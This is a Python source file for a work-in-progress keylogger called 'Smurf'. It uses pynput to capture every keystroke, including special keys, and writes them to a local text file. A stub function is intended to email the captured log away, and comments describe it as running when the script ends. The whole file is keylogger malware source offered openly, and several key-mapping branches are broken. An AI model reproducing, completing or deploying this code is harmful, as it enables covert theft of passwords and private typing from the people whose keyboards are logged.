from pynput.keyboard import Listener
from datetime import datetime # add date stamps to each new line
import time

class Smurf:

    def __init__(self):
        self.char_count = 0

    def clear_file_init(self):
        # reset the file
        open("src/keystrokes.txt", "w").close()

    def send_away(self):
        print("sending email...")
        # send an email with the attached txt file
    
    def release_me(self, key):
        """ On release key strokes, not finished yet... """
        string = str(key)
        if key == 'Key.shift_r' or string == 'Key.shift':
            string = " [SHIFTRELEASE] "
            with open("src/keystrokes.txt", "a") as f:
                print("Key released: " + string)
                f.write(string)

    def listen_to_me(self, keypress):
        self.char_count += 1
        string_key = str(keypress)

        if string_key == 'Key.space':
            string_key = "' '"
        elif string_key == 'Key.enter':
            string_key = "'\n [ENTER] '"
        elif string_key == 'Key.shift_r' or string_key == 'Key.shift':
            string_key = "' [SHIFT]+'"
        elif string_key == 'Key.ctrl_l': # this does not work for some reason
            string_key == "' [CTRL]+'"
        elif string_key == 'Key.backspace':
            string_key = "' [BACKSPACE] '"
        elif string_key == 'Key.caps_lock':
            string_key == "' [CAPSLOCK] '"
        elif string_key == 'Key.alt_l' or string_key == 'Key.alt_r': # this does not work for some reason
            string_key == "' [ALT] '"
        elif string_key == 'Key.tab': # this does not work for some fucking reason
            string_key == "' [TAB] '"
        elif string_key == 'Key.up':
            string_key = "' [KEYUP] '"
        elif string_key == 'Key.down':
            string_key = "' [KEYDOWN] '"
        elif string_key == 'Key.left':
            string_key = "' [KEYLEFT] '"
        elif string_key == 'Key.right':
            string_key = "' [KEYRIGHT] '"
        # for testing purposes
        elif string_key == 'Key.esc':
            exit()
        else:
            pass

        # format the string
        format_string = string_key[1:-1]

        with open("src/keystrokes.txt", "a") as f:
            if self.char_count < 71: # Temporary formatting solution
                print("Key registered: " + format_string)
                f.write(format_string)
            else:
                f.write("\n")
                self.char_count = 0
                f.write(format_string)

if __name__ == "__main__":
    smf = Smurf()
    smf.clear_file_init()
    print("listening... ")
    with Listener(on_press=smf.listen_to_me, on_release=smf.release_me) as agent:
            agent.join()
            # if the script is interrupted or before it ends, it will save and send an email
            smf.send_away()